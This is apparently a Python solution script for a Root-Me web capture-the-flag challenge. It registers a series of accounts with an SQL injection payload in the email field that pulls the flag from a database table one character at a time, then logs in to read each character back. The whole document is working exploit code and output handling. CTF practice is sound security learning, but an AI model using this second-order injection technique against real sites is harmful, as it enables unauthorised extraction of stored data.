import requests
import re

#Change username to any value you want, make sure it's not same as existed username
username='dynn'
url='http://challenge01.root-me.org/web-serveur/ch33/?action='
flag=''
replacestr=''
for i in range(1,31):
	r = requests.post(url+'register',data={'username':username+str(i),'password':'1234','email':f"0'+ascii(replace((SELECT flag from flag),'{replacestr}','')))#"})
	r = requests.post(url+'login',data={'username':username+str(i),'password':'1234'})
	if 'fail' not in r.text:
		found = re.search('Email : (.*)<br />', r.text).group(1)
		foundstr = chr(int(found))
		flag+=foundstr
		print(flag)
		replacestr+=foundstr
	else:
		print('fail')
		break


